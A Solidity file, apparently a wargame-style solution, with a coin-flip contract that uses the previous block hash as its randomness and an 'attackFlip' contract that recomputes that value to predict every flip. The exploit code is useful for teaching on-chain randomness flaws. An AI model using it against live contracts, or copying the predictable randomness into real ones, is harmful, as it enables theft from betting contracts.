//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract attackFlip{
    using SafeMath for uint256;
    CoinFlip public flipper;
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    uint data;
    constructor(uint256 targetaddr) public {
         //0x414FcBf6b2681a5B0e5b2c6D4808852A38F1f82d
         flipper = CoinFlip(targetaddr);
       }
   
    
    function flipHack() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        // call the deployed contract
        
        bool result = flipper.flip(side);
        return result;
    }
    
 
}
